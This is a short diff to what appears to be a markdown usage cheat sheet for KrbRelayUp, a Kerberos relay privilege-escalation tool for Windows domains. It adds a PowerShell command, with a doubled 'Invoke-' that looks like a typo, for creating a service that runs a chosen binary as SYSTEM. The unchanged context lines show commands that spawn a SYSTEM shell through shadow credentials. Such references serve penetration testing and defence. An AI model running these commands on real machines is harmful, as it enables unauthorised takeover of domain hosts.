@@ -12,6 +12,11 @@ KrbRelayUp.exe relay -d <domain> -c -cn <newComputer> -cp <newPassword>
 KrbRelayUp.exe spawn -d <domain> -cn <newComputer> -cp <newPassword> 
 ```
 
+### Request TGS to create new service running as SYSTEM and execute given binary
+```
+Invoke-Invoke-KrbRelayUp -Command 'spawn -d <domain> -cn <computername> -cp <computerpassword> -sc C:\path\executable.exe'
+```
+
 ### Start SYSTEM cmd shell, -f = force shadow (clear msDS-KeyCredentialLink before adding new shadow creds)
 ```
 KrbRelayUp.exe full -m shadowcred -f
